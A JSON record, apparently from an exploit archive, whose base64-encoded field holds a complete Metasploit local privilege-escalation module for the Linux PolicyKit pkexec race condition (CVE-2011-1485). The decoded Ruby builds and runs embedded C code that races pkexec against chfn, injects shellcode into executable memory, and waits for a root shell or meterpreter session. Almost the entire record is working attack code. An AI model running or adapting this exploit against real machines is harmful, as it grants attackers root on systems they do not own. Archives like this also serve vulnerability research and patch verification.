{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBtb2R1bGUgcmVxdWlyZXMgTWV0YXNwbG9pdDogaHR0cC8vbWV0YXNwbG9pdC5jb20vZG93bmxvYWQNCiMgQ3VycmVudCBzb3VyY2U6IGh0dHBzOi8vZ2l0aHViLmNvbS9yYXBpZDcvbWV0YXNwbG9pdC1mcmFtZXdvcmsNCiMjDQoNCmNsYXNzIE1ldGFzcGxvaXQ0IDwgTXNmOjpFeHBsb2l0OjpMb2NhbA0KICBSYW5rID0gR3JlYXRSYW5raW5nDQoNCiAgaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OkVYRQ0KICBpbmNsdWRlIE1zZjo6UG9zdDo6RmlsZQ0KDQogIGluY2x1ZGUgTXNmOjpFeHBsb2l0OjpMb2NhbDo6TGludXgNCg0KICBkZWYgaW5pdGlhbGl6ZShpbmZvID0ge30pDQogICAgc3VwZXIodXBkYXRlX2luZm8oaW5mbywNCiAgICAgICdOYW1lJyAgICAgICAgICA9PiAnTGludXggUG9saWN5S2l0IFJhY2UgQ29uZGl0aW9uIFByaXZpbGVnZSBFc2NhbGF0aW9uJywNCiAgICAgICdEZXNjcmlwdGlvbicgICA9PiAlcSgNCiAgICAgICAgQSByYWNlIGNvbmRpdGlvbiBmbGF3IHdhcyBmb3VuZCBpbiB0aGUgUG9saWN5S2l0IHBrZXhlYyB1dGlsaXR5IGFuZCBwb2xraXRkDQogICAgICAgIGRhZW1vbi4gQSBsb2NhbCB1c2VyIGNvdWxkIHVzZSB0aGlzIGZsYXcgdG8gYXBwZWFyIGFzIGEgcHJpdmlsZWdlZCB1c2VyIHRvDQogICAgICAgIHBrZXhlYywgYWxsb3dpbmcgdGhlbSB0byBleGVjdXRlIGFyYml0cmFyeSBjb21tYW5kcyBhcyByb290IGJ5IHJ1bm5pbmcNCiAgICAgICAgdGhvc2UgY29tbWFuZHMgd2l0aCBwa2V4ZWMuDQoNCiAgICAgICAgVGhvc2UgdnVsbmVyYWJsZSBpbmNsdWRlIFJIRUw2IHByaW9yIHRvIHBvbGtpdC0wLjk2LTIuZWw2XzAuMSBhbmQgVWJ1bnR1DQogICAgICAgIGxpYnBvbGtpdC1iYWNrZW5kLTEgcHJpb3IgdG8gMC45Ni0ydWJ1bnR1MS4xICgxMC4xMCkgMC45Ni0ydWJ1bnR1MC4xDQogICAgICAgICgxMC4wNCBMVFMpIGFuZCAwLjk0LTF1YnVudHUxLjEgKDkuMTApDQogICAgICApLA0KICAgICAgJ0xpY2Vuc2UnICAgICAgID0+IE1TRl9MSUNFTlNFLA0KICAgICAgJ0F1dGhvcicgICAgICAgID0+DQogICAgICBbDQogICAgICAgICd4aTRveXUnLCAgICAgICAgICAgICAgICAgICAgICAgICAgICMgZXhwbG9pdA0KICAgICAgICAnMGEyOTQwNmQ5Nzk0ZTRmOWIzMGIzYzVkNjcwMmM3MDgnICAjIG1ldGFzcGxvaXQgbW9kdWxlDQogICAgICBdLA0KICAgICAgJ1BsYXRmb3JtJyAgICAgICA9PiBbICdsaW51eCddLA0KICAgICAgJ0FyY2gnICAgICAgICAgICA9PiBbIEFSQ0hfWDg2LCBBUkNIX1g4Nl82NCBdLA0KICAgICAgJ1Nlc3Npb25UeXBlcycgICA9PiBbICdzaGVsbCcsICdtZXRlcnByZXRlcicgXSwNCiAgICAgICdUYXJnZXRzJyAgICAgICA9Pg0KICAgICAgWw0KICAgICAgICBbICdMaW51eCB4ODYnLCAgICAgICB7ICdBcmNoJyA9PiBBUkNIX1g4NiB9IF0sDQogICAgICAgIFsgJ0xpbnV4IHg2NCcsICAgICAgIHsgJ0FyY2gnID0+IEFSQ0hfWDg2XzY0IH0gXQ0KICAgICAgXSwNCiAgICAgICdEZWZhdWx0VGFyZ2V0JyA9PiAwLA0KICAgICAgJ1JlZmVyZW5jZXMnICAgID0+DQogICAgICBbDQogICAgICAgIFsgJ0NWRScsICcyMDExLTE0ODUnIF0sDQogICAgICAgIFsgJ0VEQicsICcxNzk0MicgXSwNCiAgICAgICAgWyAnT1NWREInLCAnNzIyNjEnIF0NCiAgICAgIF0sDQogICAgICAnRGlzY2xvc3VyZURhdGUnID0+ICJBcHIgMDEgMjAxMSINCiAgICApKQ0KICAgIHJlZ2lzdGVyX29wdGlvbnMoWw0KICAgICAgT3B0U3RyaW5nLm5ldygiV3JpdGFibGVEaXIiLCBbIHRydWUsICJBIGRpcmVjdG9yeSB3aGVyZSB3ZSBjYW4gd3JpdGUgZmlsZXMgKG11c3Qgbm90IGJlIG1vdW50ZWQgbm9leGVjKSIsICIvdG1wIiBdKSwNCiAgICAgIE9wdEludC5uZXcoIkNvdW50IiwgW3RydWUsICJOdW1iZXIgb2YgYXR0ZW1wdHMgdG8gd2luIHRoZSByYWNlIGNvbmRpdGlvbiIsIDUwMCBdKSwNCiAgICAgIE9wdEludC5uZXcoIkxpc3RlbmVyVGltZW91dCIsIFt0cnVlLCAiTnVtYmVyIG9mIHNlY29uZHMgdG8gd2FpdCBmb3IgdGhlIGV4cGxvaXQiLCA2MF0pLA0KICAgICAgT3B0Qm9vbC5uZXcoIkRFQlVHIiwgWyB0cnVlLCAiTWFrZSB0aGUgZXhwbG9pdCBleGVjdXRhYmxlIGJlIHZlcmJvc2UgYWJvdXQgd2hhdCBpdCdzIGRvaW5nIiwgZmFsc2UgXSkNCiAgICBdKQ0KICBlbmQNCg0KICBkZWYgZXhlY3V0YWJsZV9wYXRoDQogICAgQGV4ZWN1dGFibGVfcGF0aCB8fD0gZGF0YXN0b3JlWyJXcml0YWJsZURpciJdICsgIi8iICsgcmFuZF90ZXh0X2FscGhhbnVtZXJpYyg4KQ0KICAgIEBleGVjdXRhYmxlX3BhdGgNCiAgZW5kDQoNCiAgZGVmIGV4cGxvaXQNCiAgICBtYWluID0gJXFeDQovKg0KKiBFeHBsb2l0IFRpdGxlOiBwa2V4ZWMgUmFjZSBjb25kaXRpb24gKENWRS0yMDExLTE0ODUpIGV4cGxvaXQNCiogQXV0aG9yOiB4aTRveXUNCiogVGVzdGVkIG9uOiByaGVsIDYNCiogQ1ZFIDogMjAxMS0xNDg1DQoqIExpbnV4IHBrZXhlYyBleHBsb2l0IGJ5IHhpNG95dSAsIHRoeCBkbUAweDU1Ny5vcmcgKiBIYXZlIGZ1bn4NCiogVSBjYW4gcmVhY2ggdXMgIEAgaHR0cDovL3d3dy53b295dW4ub3JnIDopDQoqIDBhMjk0MDogc29tZSBjaGFuZ2VzDQoqLw0KLyoNCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPGxpbWl0cy5oPg0KI2luY2x1ZGUgPHRpbWUuaD4NCiNpbmNsdWRlIDx1bmlzdGQuaD4NCiNpbmNsdWRlIDx0ZXJtaW9zLmg+DQojaW5jbHVkZSA8c3lzL3N0YXQuaD4NCiNpbmNsdWRlIDxlcnJuby5oPg0KI2luY2x1ZGUgPHBvbGwuaD4NCiNpbmNsdWRlIDxzeXMvdHlwZXMuaD4NCiNpbmNsdWRlIDxzdGRsaWIuaD4NCiNpbmNsdWRlIDxzdHJpbmcuaD4NCiovDQoNCiNkZWZpbmUgZHByaW50Zg0KDQojZGVmaW5lIE5VTEwgKCh2b2lkKikwKQ0KDQojZGVmaW5lIE1BUF9QUklWQVRFICAgMHgwMg0KI2RlZmluZSBNQVBfRklYRUQgICAgIDB4MTANCiNkZWZpbmUgTUFQX0FOT05ZTU9VUyAweDIwDQojZGVmaW5lIE1BUF9BTk9OIE1BUF9BTk9OWU1PVVMNCiNkZWZpbmUgTUFQX0ZBSUxFRCAoKHZvaWQgKiktMSkNCg0KI2RlZmluZSBQUk9UX1JFQUQgIDB4MQ0KI2RlZmluZSBQUk9UX1dSSVRFIDB4Mg0KI2RlZmluZSBQUk9UX0VYRUMgIDB4NA0KDQojZGVmaW5lIE9fQ1JFQVQgNjQNCiNkZWZpbmUgT19SRFdSIDINCg0KI2RlZmluZSBQT0xMUkROT1JNICAgICAgMHgwMDQwDQoNCnR5cGVkZWYgaW50IF9fcGlkX3Q7DQp0eXBlZGVmIGludCBfX3RpbWVfdDsNCnR5cGVkZWYNCnN0cnVjdCB7DQogICAgICAgIGxvbmcgX192YWxbMl07DQp9IF9fcXVhZF90Ow0KdHlwZWRlZiBfX3F1YWRfdCBfX2Rldl90Ow0KdHlwZWRlZiBsb25nIF9faW5vX3Q7DQp0eXBlZGVmIHVuc2lnbmVkIGxvbmcgX19tb2RlX3Q7DQp0eXBlZGVmIGxvbmcgX19ubGlua190Ow0KdHlwZWRlZiB1bnNpZ25lZCBpbnQgX191aWRfdDsNCnR5cGVkZWYgdW5zaWduZWQgaW50IF9fZ2lkX3Q7DQp0eXBlZGVmIGxvbmcgbG9uZyBfX29mZl90Ow0KdHlwZWRlZiBsb25nIF9fYmxrc2l6ZV90Ow0KdHlwZWRlZiBsb25nIGxvbmcgX19ibGtjbnRfdDsNCnN0cnVjdCBfc3RhdF9idWZmIHsNCiAgICBfX2Rldl90IHN0X2RldjsgICAgICAgICAgICAgICAgICAgICAvKiBEZXZpY2UuICAqLw0KICAgIHVuc2lnbmVkIHNob3J0IGludCBfX3BhZDE7DQogICAgX19pbm9fdCBzdF9pbm87ICAgICAgICAgICAgICAgICAgICAgLyogRmlsZSBzZXJpYWwgbnVtYmVyLiAgKi8NCiAgICBfX21vZGVfdCBzdF9tb2RlOyAgICAgICAgICAgICAgICAgICAvKiBGaWxlIG1vZGUuICAqLw0KICAgIF9fbmxpbmtfdCBzdF9ubGluazsgICAgICAgICAgICAgICAgIC8qIExpbmsgY291bnQuICAqLw0KICAgIF9fdWlkX3Qgc3RfdWlkOyAgICAgICAgICAgICAgICAgICAgIC8qIFVzZXIgSUQgb2YgdGhlIGZpbGUncyBvd25lci4gKi8NCiAgICBfX2dpZF90IHN0X2dpZDsgICAgICAgICAgICAgICAgICAgICAvKiBHcm91cCBJRCBvZiB0aGUgZmlsZSdzIGdyb3VwLiovDQogICAgX19kZXZfdCBzdF9yZGV2OyAgICAgICAgICAgICAgICAgICAgLyogRGV2aWNlIG51bWJlciwgaWYgZGV2aWNlLiAgKi8NCiAgICB1bnNpZ25lZCBzaG9ydCBpbnQgX19wYWQyOw0KICAgIF9fb2ZmX3Qgc3Rfc2l6ZTsgICAgICAgICAgICAgICAgICAgIC8qIFNpemUgb2YgZmlsZSwgaW4gYnl0ZXMuICAqLw0KICAgIF9fYmxrc2l6ZV90IHN0X2Jsa3NpemU7ICAgICAgICAgICAgIC8qIE9wdGltYWwgYmxvY2sgc2l6ZSBmb3IgSS9PLiAgKi8NCiAgICBfX2Jsa2NudF90IHN0X2Jsb2NrczsgICAgICAgICAgICAgICAvKiBOdW1iZXIgNTEyLWJ5dGUgYmxvY2tzIGFsbG9jYXRlZC4gKi8NCiAgICBfX3RpbWVfdCBzdF9hdGltZTsgICAgICAgICAgICAgICAgICAvKiBUaW1lIG9mIGxhc3QgYWNjZXNzLiAgKi8NCiAgICB1bnNpZ25lZCBsb25nIGludCBzdF9hdGltZW5zZWM7ICAgICAvKiBOc2NlY3Mgb2YgbGFzdCBhY2Nlc3MuICAqLw0KICAgIF9fdGltZV90IHN0X210aW1lOyAgICAgICAgICAgICAgICAgIC8qIFRpbWUgb2YgbGFzdCBtb2RpZmljYXRpb24uICAqLw0KICAgIHVuc2lnbmVkIGxvbmcgaW50IHN0X210aW1lbnNlYzsgICAgIC8qIE5zZWNzIG9mIGxhc3QgbW9kaWZpY2F0aW9uLiAgKi8NCiAgICBfX3RpbWVfdCBzdF9jdGltZTsgICAgICAgICAgICAgICAgICAvKiBUaW1lIG9mIGxhc3Qgc3RhdHVzIGNoYW5nZS4gICovDQogICAgdW5zaWduZWQgbG9uZyBpbnQgc3RfY3RpbWVuc2VjOyAgICAgLyogTnNlY3Mgb2YgbGFzdCBzdGF0dXMgY2hhbmdlLiAgKi8NCiAgICB1bnNpZ25lZCBsb25nIGludCBfX3VudXNlZDQ7DQogICAgdW5zaWduZWQgbG9uZyBpbnQgX191bnVzZWQ1Ow0KfTsNCg0Kc3RydWN0IF9wb2xsZmQgew0KICAgIGludCAgIGZkOyAgICAgICAgIC8qIGZpbGUgZGVzY3JpcHRvciAqLw0KICAgIHNob3J0IGV2ZW50czsgICAgIC8qIHJlcXVlc3RlZCBldmVudHMgKi8NCiAgICBzaG9ydCByZXZlbnRzOyAgICAvKiByZXR1cm5lZCBldmVudHMgKi8NCn07DQp0eXBlZGVmIHVuc2lnbmVkIGxvbmcgc2l6ZV90Ow0KZXh0ZXJuIHZvaWQgKm1tYXAodm9pZCAqX19hZGRyLCBzaXplX3QgX19sZW4sIGludCBfX3Byb3QsIGludCBfX2ZsYWdzLCBpbnQgX19mZCwgX19vZmZfdCBfX29mZnNldCk7DQpleHRlcm4gaW50IG1wcm90ZWN0KHZvaWQgKl9fYWRkciwgc2l6ZV90IF9fbGVuLCBpbnQgX19wcm90KTsNCmV4dGVybiB2b2lkIGV4aXQoaW50IF9fc3RhdHVzKTsNCmV4dGVybiBpbnQgcHJpbnRmKGNvbnN0IGNoYXIgKl9fZm9ybWF0LCAuLi4pOw0KZXh0ZXJuIF9fcGlkX3QgZm9yayh2b2lkKTsNCmV4dGVybiBfX3RpbWVfdCB0aW1lKF9fdGltZV90ICp0KTsNCmV4dGVybiBfX3BpZF90IGdldHBpZCh2b2lkKTsNCmV4dGVybiBfX3VpZF90IGdldGV1aWQodm9pZCk7DQpleHRlcm4gdm9pZCBzcmFuZCh1bnNpZ25lZCBpbnQgc2VlZCk7DQpleHRlcm4gaW50IHNucHJpbnRmKGNoYXIgKnN0ciwgc2l6ZV90IHNpemUsIGNvbnN0IGNoYXIgKmZvcm1hdCwgLi4uKTsNCmV4dGVybiBpbnQgcGlwZShpbnQgcGlwZWZkWzJdKTsNCmV4dGVybiBpbnQgY2xvc2UoaW50IGZkKTsNCmV4dGVybiB2b2lkIHdyaXRlKGludCBmZCwgY29uc3Qgdm9pZCAqYnVmLCBzaXplX3QgY291bnQpOw0KZXh0ZXJuIGludCBkdXAyKGludCBvbGRmZCwgaW50IG5ld2ZkKTsNCmV4dGVybiB2b2lkIHBlcnJvcihjb25zdCBjaGFyICpfX3MpOw0KZXh0ZXJuIHZvaWQgcmVhZChpbnQgZmQsIHZvaWQgKmJ1Ziwgc2l6ZV90IGNvdW50KTsNCmV4dGVybiBpbnQgZXhlY3ZlKGNvbnN0IGNoYXIgKmZpbGVuYW1lLCBjaGFyICpjb25zdCBhcmd2W10sIGNoYXIgKmNvbnN0IGVudnApOw0KZXh0ZXJuIGludCB1c2xlZXAoaW50IHVzZWMpOw0KZXh0ZXJuIHZvaWQgKm1lbXNldCh2b2lkICpzLCBpbnQgYywgc2l6ZV90IG4pOw0KZXh0ZXJuIHZvaWQgKm1lbWNweSh2b2lkICogZHN0LCBjb25zdCB2b2lkICpzcmMsIHNpemVfdCBuKTsNCmV4dGVybiBpbnQgcG9sbChzdHJ1Y3QgX3BvbGxmZCAqZmRzLCB1bnNpZ25lZCBpbnQgbmZkcywgaW50IHRpbWVvdXQpOw0KZXh0ZXJuIGNoYXIgKnN0cnN0cihjb25zdCBjaGFyICpoYXlzdGFjaywgY29uc3QgY2hhciAqbmVlZGxlKTsNCmV4dGVybiBpbnQgcmFuZCh2b2lkKTsNCmV4dGVybiBpbnQgdW5saW5rKGNvbnN0IGNoYXIgKl9fbmFtZSk7DQoNCmludCBtYWluKGludCBhcmdjLGNoYXIgKmFyZ3ZbXSwgY2hhciAqKiBlbnZwKQ0Kew0KDQogICAgX190aW1lX3QgdGltX3NlZWQxOw0KICAgIF9fcGlkX3QgcGlkX3NlZWQyOw0KICAgIGludCByZXN1bHQ7DQogICAgc3RydWN0IF9zdGF0X2J1ZmYgc3RhdF9idWZmOw0KDQogICAgY2hhciAqIGNoZm5fcGF0aCA9ICIvdXNyL2Jpbi9jaGZuIjsNCiAgICBjaGFyICogY21kX3BhdGggPSAiIjsNCg0KICAgIGNoYXIgKiBwa2V4ZWNfYXJndltdID0gew0KICAgICAgICAiL3Vzci9iaW4vcGtleGVjIiwNCiAgICAgICAgIi9iaW4vc2giLA0KICAgICAgICAiLWMiLA0KICAgICAgICBjbWRfcGF0aCwNCiAgICAgICAgTlVMTA0KICAgIH07DQogICAgaW50IHBpcGUxWzJdOw0KICAgIGludCBwaXBlMlsyXTsNCiAgICBpbnQgcGlwZTNbMl07DQogICAgX19waWRfdCBwaWQscGlkMiA7DQogICAgY2hhciAqIGNoZm5fYXJndltdID0gew0KICAgICAgICAiL3Vzci9iaW4vY2hmbiIsDQogICAgICAgIE5VTEwNCiAgICB9Ow0KDQogICAgY2hhciBidWZmWzhdOw0KICAgIGNoYXIgcmVhZF9idWZmWzQwOTZdOw0KICAgIGNoYXIgcmVhbF9wYXRoWzUxMl07DQoNCiAgICBpbnQgY291bnQgPSAwOw0KICAgIGludCBmbGFnID0gMDsNCiAgICB1bnNpZ25lZCBpbnQgdXNsZWVwMSA9IDA7DQogICAgdW5zaWduZWQgaW50IHVzbGVlcDIgPSAwOw0KDQogICAgdGltX3NlZWQxID0gdGltZShOVUxMKTsNCiAgICBwaWRfc2VlZDIgPSBnZXRwaWQoKTsNCiAgICBzcmFuZCh0aW1fc2VlZDErcGlkX3NlZWQyKTsNCg0KICAgIGlmKCFnZXRldWlkKCkpew0KDQogICAgICB1bmxpbmsoY21kX3BhdGgpOw0KDQogICAgICBTSEVMTENPREUNCg0KICAgICAgaW50IHNoZWxsY29kZV9zaXplID0gMDsNCiAgICAgIGludCBpOw0KICAgICAgdW5zaWduZWQgbG9uZyAoKmZ1bmMpKCk7DQogICAgICBmdW5jID0gbW1hcChOVUxMLCAweDEwMDAsDQogICAgICAgIFBST1RfUkVBRCB8IFBST1RfV1JJVEUgfCBQUk9UX0VYRUMsDQogICAgICAgIE1BUF9QUklWQVRFIHwgTUFQX0FOT05ZTU9VUywNCiAgICAgICAgMCwgMA0KICAgICAgKTsNCiAgICAgIG1wcm90ZWN0KGZ1bmMsIDQwOTYsIFBST1RfUkVBRHxQUk9UX1dSSVRFfFBST1RfRVhFQyk7DQogICAgICBkcHJpbnRmKCJDb3B5aW5nICVkIGJ5dGVzIG9mIHNoZWxsY29kZVxuIiwgc2hlbGxjb2RlX3NpemUpOw0KICAgICAgLy9mb3IgKGkgPSAwOyBpIDwgc2hlbGxjb2RlX3NpemU7IGkrKykgew0KICAgICAgICAvLyhjaGFyKWZ1bmNbaV0gPSAoY2hhcilzaGVsbGNvZGVbaV07DQogICAgICAgICBtZW1jcHkoZnVuYyxzaGVsbGNvZGUsc2hlbGxjb2RlX3NpemUpOw0KICAgICAgLy99DQogICAgICBkcHJpbnRmKCJGb3JraW5nIGJlZm9yZSBjYWxsaW5nIHNoZWxsY29kZTogMHglcFxuIiwgZnVuYyk7DQogICAgICBpZiAoZm9yaygpKSB7DQogICAgICAgIGV4aXQoMCk7DQogICAgICB9DQogICAgICBmdW5jKCk7DQogICAgfQ0KDQogICAgaWYocGlwZShwaXBlMSkpew0KICAgICAgICBwZXJyb3IoInBpcGUiKTsNCiAgICAgICAgZXhpdCgtMik7DQogICAgfQ0KDQogICAgZm9yKGNvdW50ID0gQ09VTlQ7IGNvdW50ICYmICFmbGFnOyBjb3VudC0tKXsNCiAgICAgICAgZHByaW50ZigiY291bnQgJWQgdXNsZWVwMSAlZCB1c2xlZXAyICVkXG4iLGNvdW50LHVzbGVlcDEsdXNsZWVwMik7DQogICAgICAgIHBpZCA9IGZvcmsoKTsNCiAgICAgICAgaWYoICFwaWQgKXsNCiAgICAgICAgICAgIC8vIFBhcmVudA0KICAgICAgICAgICAgaWYoICFwaXBlKHBpcGUyKSl7DQogICAgICAgICAgICAgICAgaWYoIXBpcGUocGlwZTMpKXsNCiAgICAgICAgICAgICAgICAgICAgcGlkMiA9IGZvcmsoKTsNCiAgICAgICAgICAgICAgICAgICAgaWYoIXBpZDIpew0KICAgICAgICAgICAgICAgICAgICAgICAgLy8gUGFyZW50IDINCiAgICAgICAgICAgICAgICAgICAgICAgIGNsb3NlKDEpOw0KICAgICAgICAgICAgICAgICAgICAgICAgY2xvc2UoMik7DQogICAgICAgICAgICAgICAgICAgICAgICBjbG9zZShwaXBlMVswXSk7DQogICAgICAgICAgICAgICAgICAgICAgICBkdXAyKHBpcGUxWzFdLDIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgZHVwMihwaXBlMVsxXSwxKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNsb3NlKHBpcGUxWzFdKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNsb3NlKHBpcGUyWzBdKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNsb3NlKHBpcGUzWzFdKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIHdyaXRlKHBpcGUyWzFdLCJceEZGIiwxKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIHJlYWQocGlwZTNbMF0sJmJ1ZmYsMSk7DQogICAgICAgICAgICAgICAgICAgICAgICBleGVjdmUocGtleGVjX2FyZ3ZbMF0scGtleGVjX2FyZ3YsZW52cCk7DQogICAgICAgICAgICAgICAgICAgICAgICBwZXJyb3IoImV4ZWN2ZSBwa2V4ZWMiKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGV4aXQoLTMpOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIGNsb3NlKDApOw0KICAgICAgICAgICAgICAgICAgICBjbG9zZSgxKTsNCiAgICAgICAgICAgICAgICAgICAgY2xvc2UoMik7DQogICAgICAgICAgICAgICAgICAgIGNsb3NlKHBpcGUyWzFdKTsNCiAgICAgICAgICAgICAgICAgICAgY2xvc2UocGlwZTNbMF0pOw0KICAgICAgICAgICAgICAgICAgICByZWFkKHBpcGUyWzBdLCZidWZmLDEpOw0KICAgICAgICAgICAgICAgICAgICB3cml0ZShwaXBlM1sxXSwiXHhGRiIsMSk7DQogICAgICAgICAgICAgICAgICAgIHVzbGVlcCh1c2xlZXAxK3VzbGVlcDIpOw0KICAgICAgICAgICAgICAgICAgICBleGVjdmUoY2hmbl9hcmd2WzBdLGNoZm5fYXJndixlbnZwKTsNCiAgICAgICAgICAgICAgICAgICAgcGVycm9yKCJleGVjdmUgc2V0dWlkIik7DQogICAgICAgICAgICAgICAgICAgIGV4aXQoMSk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcGVycm9yKCJwaXBlMyIpOw0KICAgICAgICAgICAgZXhpdCgxKTsNCiAgICAgICAgfQ0KDQogICAgICAgIC8vTm90ZTogVGhpcyBpcyBjaGlsZCwgbm8gcGlwZTMgd2UgdXNlIHBvbGwgdG8gbW9uaXRvciBwaXBlMVswXQ0KICAgICAgICBtZW1zZXQocGlwZTMsMCw4KTsNCg0KICAgICAgICBzdHJ1Y3QgX3BvbGxmZCAqIHBvbGxmZCA9IChzdHJ1Y3QgcG9sbGZkICopKCZwaXBlMyk7DQogICAgICAgIHBvbGxmZC0+ZmQgPSBwaXBlMVswXTsNCiAgICAgICAgcG9sbGZkLT5ldmVudHMgPSAgUE9MTFJETk9STTsNCg0KICAgICAgICBpZihwb2xsKHBvbGxmZCwxLDEwMDApIDwgMCl7DQogICAgICAgICAgICBwZXJyb3IoInBvbGwiKTsNCiAgICAgICAgICAgIGV4aXQoMSk7DQogICAgICAgIH0NCg0KICAgICAgICBpZihwb2xsZmQtPnJldmVudHMgJiBQT0xMUkROT1JNICl7DQogICAgICAgICAgICBtZW1zZXQocmVhZF9idWZmLDAsNDA5Nik7DQogICAgICAgICAgICByZWFkKHBpcGUxWzBdLHJlYWRfYnVmZiw0MDk1KTsNCiAgICAgICAgICAgIGlmKCBzdHJzdHIocmVhZF9idWZmLCJkb2VzIG5vdCBtYXRjaCIpKXsNCiAgICAgICAgICAgICAgICB1c2xlZXAxICs9IDEwMDsNCiAgICAgICAgICAgICAgICB1c2xlZXAyID0gcmFuZCgpICUgMTAwMDsNCiAgICAgICAgICAgIH1lbHNlew0KICAgICAgICAgICAgICAgIGlmKHVzbGVlcDEgPiAwKXsNCiAgICAgICAgICAgICAgICAgIHVzbGVlcDEgLT0gMTAwOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCiAgICByZXN1bHQgPSAwOw0KICAgIHVubGluayhjbWRfcGF0aCk7DQogICAgcmV0dXJuIHJlc3VsdDsNCn0NCg0KXg0KICAgIG1haW4uZ3N1YiEoL1NIRUxMQ09ERS8sIFJleDo6VGV4dC50b19jKHBheWxvYWQuZW5jb2RlZCwgNjQsICJzaGVsbGNvZGUiKSkNCiAgICBtYWluLmdzdWIhKC9zaGVsbGNvZGVfc2l6ZSA9IDAvLCAic2hlbGxjb2RlX3NpemUgPSAje3BheWxvYWQuZW5jb2RlZC5sZW5ndGh9IikNCiAgICBtYWluLmdzdWIhKC9jbWRfcGF0aCA9ICIiLywgImNtZF9wYXRoID0gXCIje2V4ZWN1dGFibGVfcGF0aH1cIiIpDQogICAgbWFpbi5nc3ViISgvQ09VTlQvLCBkYXRhc3RvcmVbIkNvdW50Il0udG9fcykNCiAgICBtYWluLmdzdWIhKC8jZGVmaW5lIGRwcmludGYvLCAiI2RlZmluZSBkcHJpbnRmIHByaW50ZiIpIGlmIGRhdGFzdG9yZVsnREVCVUcnXQ0KDQogICAgY3B1ID0gbmlsDQogICAgaWYgdGFyZ2V0WydBcmNoJ10gPT0gQVJDSF9YODYNCiAgICAgIGNwdSA9IE1ldGFzbTo6SWEzMi5uZXcNCiAgICBlbHNpZiB0YXJnZXRbJ0FyY2gnXSA9PSBBUkNIX1g4Nl82NA0KICAgICAgY3B1ID0gTWV0YXNtOjpYODZfNjQubmV3DQogICAgZW5kDQoNCiAgICBiZWdpbg0KICAgICAgZWxmID0gTWV0YXNtOjpFTEYuY29tcGlsZV9jKGNwdSwgbWFpbikuZW5jb2RlX3N0cmluZw0KICAgIHJlc2N1ZQ0KICAgICAgcHJpbnRfZXJyb3IgIk1ldGFzbSBFbmNvZGluZyBmYWlsZWQ6ICN7JEVSUk9SX0lORk99Ig0KICAgICAgZWxvZyAiTWV0YXNtIEVuY29kaW5nIGZhaWxlZDogI3skRVJST1JfSU5GTy5jbGFzc30gOiAjeyRFUlJPUl9JTkZPfSINCiAgICAgIGVsb2cgIkNhbGwgc3RhY2s6XG4jeyRFUlJPUl9JTkZPLmJhY2t0cmFjZS5qb2luKCJcbiIpfSINCiAgICAgIHJldHVybg0KICAgIGVuZA0KDQogICAgcHJpbnRfc3RhdHVzICJXcml0aW5nIGV4cGxvaXQgZXhlY3V0YWJsZSB0byAje2V4ZWN1dGFibGVfcGF0aH0gKCN7ZWxmLmxlbmd0aH0gYnl0ZXMpIg0KICAgIHJtX2YgZXhlY3V0YWJsZV9wYXRoDQogICAgd3JpdGVfZmlsZShleGVjdXRhYmxlX3BhdGgsIGVsZikNCiAgICBvdXRwdXQgPSBjbWRfZXhlYygiY2htb2QgK3ggI3tleGVjdXRhYmxlX3BhdGh9OyAje2V4ZWN1dGFibGVfcGF0aH0iKQ0KICAgIG91dHB1dC5lYWNoX2xpbmUgeyB8bGluZXwgcHJpbnRfZGVidWcgbGluZS5jaG9tcCB9DQoNCiAgICBzdGltZSA9IFRpbWUubm93LnRvX2YNCiAgICBwcmludF9zdGF0dXMgIlN0YXJ0aW5nIHRoZSBwYXlsb2FkIGhhbmRsZXIuLi4iDQogICAgdW50aWwgc2Vzc2lvbl9jcmVhdGVkPyB8fCBzdGltZSArIGRhdGFzdG9yZVsnTGlzdGVuZXJUaW1lb3V0J10gPCBUaW1lLm5vdy50b19mDQogICAgICBSZXguc2xlZXAoMSkNCiAgICBlbmQNCiAgZW5kDQplbmQ=", 
    "filename": "platforms/linux/local/35021.rb", 
    "id": "35021", 
    "cves": [
        "CVE-2011-1485"
    ]
}